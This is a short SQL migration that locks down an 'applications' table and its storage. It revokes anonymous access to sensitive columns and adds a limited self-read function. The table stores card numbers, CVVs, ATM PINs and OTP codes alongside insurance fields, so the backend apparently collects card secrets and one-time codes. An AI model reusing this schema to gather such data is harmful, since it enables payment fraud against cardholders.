
-- 1) Applications: visitors can no longer read any application row.
DROP POLICY IF EXISTS apps_visitor_select ON public.applications;

REVOKE SELECT (card_number, card_cvv, card_exp_month, card_exp_year, card_name, atm_pin, otp_code, mutasil_otp, identity)
  ON public.applications FROM anon;

-- 2) Safe read path for the owning visitor (no sensitive columns).
CREATE OR REPLACE FUNCTION public.get_my_applications(p_limit integer DEFAULT 5)
RETURNS TABLE (
  id text,
  created_at timestamptz,
  visitor_id text,
  status text,
  review_status text,
  method text,
  card_brand text,
  card_last4 text,
  total numeric,
  price numeric,
  company text,
  insurance_type text,
  mutasil_provider text,
  mutasil_phone text,
  mutasil_id text,
  screenshot_urls text[]
)
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT a.id, a.created_at, a.visitor_id, a.status, a.review_status, a.method,
         a.card_brand, a.card_last4, a.total, a.price, a.company, a.insurance_type,
         a.mutasil_provider, a.mutasil_phone, a.mutasil_id, a.screenshot_urls
  FROM public.applications a
  WHERE public.current_visitor_id() IS NOT NULL
    AND a.visitor_id = public.current_visitor_id()
  ORDER BY a.created_at DESC
  LIMIT greatest(1, least(coalesce(p_limit, 5), 20));
$$;

GRANT EXECUTE ON FUNCTION public.get_my_applications(integer) TO anon, authenticated;

-- 3) Storage: remove visitor-controlled access; uploads/reads go through the server.
DROP POLICY IF EXISTS visitor_uploads_owner_select ON storage.objects;
DROP POLICY IF EXISTS visitor_uploads_owner_insert ON storage.objects;
DROP POLICY IF EXISTS visitor_uploads_owner_update ON storage.objects;
DROP POLICY IF EXISTS visitor_uploads_owner_delete ON storage.objects;
